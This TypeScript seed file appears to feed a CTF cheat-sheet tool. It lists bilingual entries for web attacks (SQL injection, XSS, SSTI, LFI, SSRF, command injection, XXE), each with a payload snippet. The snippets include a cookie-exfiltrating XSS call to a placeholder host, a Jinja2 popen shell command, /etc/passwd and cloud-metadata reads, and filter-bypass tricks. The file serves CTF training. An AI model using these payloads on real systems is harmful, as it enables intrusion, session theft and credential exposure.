// CTF 题型速查种子数据（批次 M）：Web 域。
// 条目内容全部指向项目载荷知识库已有条目（scripts/legacy-seed/webPayloads.ts），点击跳载荷 tab 对应条目；
// 不在此重复建设知识内容，宁缺毋滥。

import type { CheatEntry } from './index';

export const webCheatEntries: CheatEntry[] = [
  {
    id: 'web-sqli-union',
    title: { zh: '联合查询注入（UNION）', en: 'UNION query injection' },
    summary: {
      zh: '列数对上就能直接回显数据，是拿 flag 最快的一条路。先用 ORDER BY 探列数，再 UNION SELECT 回显。',
      en: 'Fastest path to the flag once column counts line up. Probe columns with ORDER BY, then echo data via UNION SELECT.',
    },
    snippet: "' ORDER BY 3-- -\n' UNION SELECT 1,username,password FROM users-- -",
    tip: { zh: '回显位不对时，让前几列返回 NULL 更稳。', en: 'Use NULL for unused columns when the reflection position is unclear.' },
    jump: { kind: 'payload', id: 'sqli-union-query' },
  },
  {
    id: 'web-sqli-time-based',
    title: { zh: '时间盲注', en: 'Time-based blind injection' },
    summary: {
      zh: '页面无回显时靠响应延迟一位位猜数据，脚本按字符二分最快。',
      en: 'When the page shows nothing, leak data one character at a time via response delays; binary-search per character.',
    },
    snippet: "1' AND IF(SUBSTRING(database(),1,1)='c', SLEEP(3), 0)-- -",
    tip: { zh: '注意平台请求超时，延迟别设太长；先猜库名再猜表。', en: 'Mind request timeouts; keep delays short and pivot database → tables.' },
    jump: { kind: 'payload', id: 'sqli2-time-based-blind-sqli' },
  },
  {
    id: 'web-xss-reflected',
    title: { zh: '反射型 XSS', en: 'Reflected XSS' },
    summary: {
      zh: '输入点回显在页面里就能试标签逃逸；CTF 里常配合 bot 接收 cookie。',
      en: 'If input is reflected into the page, test tag breakout; pair with a bot to exfiltrate cookies.',
    },
    snippet: '<img src=x onerror="fetch(`//your.host/?c=`+document.cookie)">',
    tip: { zh: '先确认过滤了什么：标签、事件、括号还是关键字，再挑绕过姿势。', en: 'Fingerprint the filter first (tags, events, parens, keywords), then pick a bypass.' },
    jump: { kind: 'payload', id: 'xss-reflected' },
  },
  {
    id: 'web-ssti-jinja2',
    title: { zh: 'SSTI 模板注入（Jinja2）', en: 'SSTI (Jinja2)' },
    summary: {
      zh: '模板表达式被当代码执行，{{7*7}} 回显 49 即确认；Jinja2 沿 __mro__ 找到 os 模块。',
      en: 'Template expressions execute as code: {{7*7}} returning 49 confirms it; walk __mro__ to reach os.',
    },
    snippet: '{{7*7}}\n{{ config.__class__.__init__.__globals__[\'os\'].popen(\'cat /flag\').read() }}',
    tip: { zh: '先分清引擎：{{7*7}}=49 是 Jinja2，<%= 7*7 %> 是 ERB/EJS 系。', en: 'Identify the engine first: {{7*7}}=49 means Jinja2; <%= 7*7 %> means ERB/EJS family.' },
    jump: { kind: 'payload', id: 'ssti-jinja2' },
  },
  {
    id: 'web-lfi-traversal',
    title: { zh: '目录穿越 / 文件包含', en: 'Path traversal / LFI' },
    summary: {
      zh: '参数能带文件名就试 ../ 回溯读 /flag、/etc/passwd；PHP 站点优先试 filter 伪协议。',
      en: 'If a parameter takes a filename, walk up with ../ to read /flag or /etc/passwd; on PHP try the filter wrapper first.',
    },
    snippet: '?file=../../../../etc/passwd\n?file=php://filter/convert.base64-encode/resource=/flag',
    tip: { zh: '被过滤时试双写 ....// 或绝对路径；日志注入可搭配文件包含拿 shell。', en: 'On filters try ....// or absolute paths; log poisoning chains into LFI for a shell.' },
    jump: { kind: 'payload', id: 'lfi-traversal-marker-read-boundary' },
  },
  {
    id: 'web-ssrf-basic',
    title: { zh: 'SSRF 内网探测', en: 'SSRF basics' },
    summary: {
      zh: '服务器替你发请求：打内网服务、云 metadata（169.254.169.254）常直接出 flag。',
      en: 'The server requests on your behalf: hit internal services or cloud metadata (169.254.169.254) for flags.',
    },
    snippet: '?url=http://127.0.0.1:8080/admin\n?url=http://169.254.169.254/latest/meta-data/',
    tip: { zh: '只认域名时用 DNS 重绑定或 @ 符号绕过；gopher 协议可转任意 TCP 报文。', en: 'For allowlists try DNS rebinding or the @ trick; gopher turns SSRF into raw TCP.' },
    jump: { kind: 'payload', id: 'ssrf-basic' },
  },
  {
    id: 'web-command-injection',
    title: { zh: '命令注入', en: 'Command injection' },
    summary: {
      zh: '输入拼进系统命令时用管道/分号追加自己的命令；无回显可外带或写文件。',
      en: 'When input lands in a system command, append yours with pipes or semicolons; exfiltrate or write to a file if blind.',
    },
    snippet: '127.0.0.1; cat /flag*\n127.0.0.1 && find / -name "flag*" 2>/dev/null',
    tip: { zh: '过滤分号就换 `、$()、%0a（换行）；空格被过滤用 ${IFS}。', en: 'Swap semicolons for backticks, $(), or %0a; replace spaces with ${IFS}.' },
    jump: { kind: 'payload', id: 'rce-command-injection' },
  },
  {
    id: 'web-xxe-basic',
    title: { zh: 'XXE 实体注入', en: 'XXE basics' },
    summary: {
      zh: 'XML 输入点解析外部实体就能读文件；有回显直接读，无回显走 OOB 外带。',
      en: 'If XML input is parsed with external entities, read files directly — or go OOB when blind.',
    },
    snippet: '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag">]>\n<r>&xxe;</r>',
    tip: { zh: 'PHP 协议可读 base64 绕过内容校验；Java 栈常支持 jar:///netrc 等姿势。', en: 'php://filter base64-encodes contents; Java stacks support jar:// and friends.' },
    jump: { kind: 'payload', id: 'xxe-basic' },
  },
];
